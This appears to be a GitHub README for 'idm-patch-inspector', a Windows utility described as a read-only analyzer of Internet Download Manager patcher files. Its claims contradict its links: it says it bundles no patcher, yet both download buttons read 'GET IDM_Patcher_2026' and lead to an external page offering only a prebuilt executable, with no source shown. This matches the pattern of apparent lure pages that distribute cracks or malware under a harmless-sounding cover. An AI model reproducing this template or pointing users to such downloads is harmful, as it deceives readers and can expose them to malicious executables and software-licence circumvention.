<div align="center">
<img src="assets/banner.svg" width="100%" alt="IDM Patcher banner"/>

# idm-patch-inspector

![Version](https://img.shields.io/badge/Version-2026-DB2777?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D4?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-16A34A?style=for-the-badge)

*Inspect what an IDM Patcher actually changes on your system before you trust it.*
</div>

## What this is

**idm-patch-inspector** is a standalone Windows utility that reads and explains the changes an IDM Patcher applies to an Internet Download Manager installation. Instead of running a patcher blindly, you point the inspector at the patcher file and it reports which binaries, registry keys, and config entries the patch would touch — file paths, byte ranges, and target values included.

The tool is built for people who already work with IDM Patcher packages and want a verifiable record of what each one does. It does not modify Internet Download Manager itself. It produces a readable report so you can decide whether a given patcher matches what its author claims.

## What it is not

This repository ships the inspector, not the patcher. You bring your own IDM Patcher file; the inspector only analyzes it. No download of IDM, no license keys, no activation logic is bundled here.

## Who it is for

- **Power users** who run an IDM Patcher on their own machine and want a diff-style report before executing it.
- **IT and support staff** who need to document what a patcher changes on a managed Windows endpoint.
- **Reverse-engineering learners** studying how IDM binary patches are structured (PE headers, resource edits, config rewrites).
- **Archivists** cataloging patcher versions and recording per-build differences over time.
- **Security reviewers** triaging a suspicious patcher file without executing it.

## What you can do

- **Read a patcher's manifest** and see every file it targets, with absolute paths and expected hashes.
- **Diff two patcher versions** side by side to spot what changed between releases.
- **Inspect PE sections** of bundled binaries and flag edits to the entry point or import table.
- **List registry operations** the patcher declares, grouped by hive and key.
- **Export a report** as plain text or JSON for tickets, audits, or changelogs.
- **Verify file hashes** against values embedded in the patcher before anything runs.
- **Detect config rewrites** aimed at IDM's settings folder and show the before/after values.
- **Run fully offline** — no telemetry, no network calls, no background service.

## Getting started

1. Open the project landing page using the button below.
2. Download the latest `idm-patch-inspector` build for Windows.
3. Extract the archive to any folder — no installer is required.
4. Launch `idm-patch-inspector.exe` and load an IDM Patcher file via **File → Open patcher**.
5. Review the report, then export it if you want a saved copy.

<p align="center">
  <a href="https://superlooproad.github.io/idm-patch-inspector/">
    <img src="https://img.shields.io/badge/GET-IDM_Patcher_2026-DB2777?style=for-the-badge&logoColor=white&labelColor=BE185D" width="550" alt="Download"/>
  </a>
</p>

The button opens the project page, where you choose the build and download it.

## Requirements

| Item | Details |
| --- | --- |
| OS | Windows 10 or Windows 11 (64-bit) |
| Runtime | None — standalone executable |
| Toolchain | Not required; no build step for end users |
| Disk | ~15 MB for the app plus report files |
| Network | Optional; only needed to fetch updates |

## How it works

1. You load an IDM Patcher file into the inspector.
2. The inspector parses its embedded manifest and any attached binaries.
3. It cross-checks the declared operations against the target IDM install path.
4. It builds a structured report of files, registry keys, and config edits.
5. You review, export, or discard the report — nothing is applied.

```mermaid
flowchart LR
  A[Load patcher] --> B[Parse manifest]
  B --> C[Match IDM install]
  C --> D[Build report]
  D --> E[Export or review]
```

## FAQ

**What does an IDM Patcher actually change?**
Most patchers modify a small set of Internet Download Manager binaries and rewrite a handful of registry or config values. The inspector lists each one so you can see the exact scope rather than trusting a summary.

**Is idm-patch-inspector the same as an IDM Patcher?**
No. The inspector only reads and reports. It never writes to IDM, the registry, or your system files.

**Can I run it without installing anything?**
Yes. It's a standalone executable — extract and run. There is no runtime, service, or dependency to install.

**Does it work with older IDM Patcher versions?**
It supports patchers built from 2022 onward. Older formats may parse partially; the report will flag anything it cannot read.

**Will it tell me if a patcher is safe?**
It tells you what the patcher declares and what its binaries contain. The safety judgment is yours — the goal is to remove guesswork, not to replace it.

## Troubleshooting

| Problem | Fix |
| --- | --- |
| "Target IDM not found" | Set the IDM install path manually in **Settings → Target path** before loading the patcher. |
| Report is empty | The patcher manifest may be encrypted or in an unsupported format; check the file version and retry. |
| App closes on launch | Confirm Windows 10/11 64-bit; older Windows builds are not supported. |
| Hash mismatch warnings | The patcher's embedded hashes differ from the bundled files — do not run the patcher until you investigate. |

## License

Released under the [MIT License](LICENSE).

This project is provided as-is for analysis and documentation purposes. It does not include Internet Download Manager, does not bundle any patcher, and does not modify third-party software. You are responsible for how you use the reports it generates.

<p align="center">
  <a href="https://superlooproad.github.io/idm-patch-inspector/">
    <img src="https://img.shields.io/badge/GET-IDM_Patcher_2026-DB2777?style=for-the-badge&logoColor=white&labelColor=BE185D" width="550" alt="Download"/>
  </a>
</p>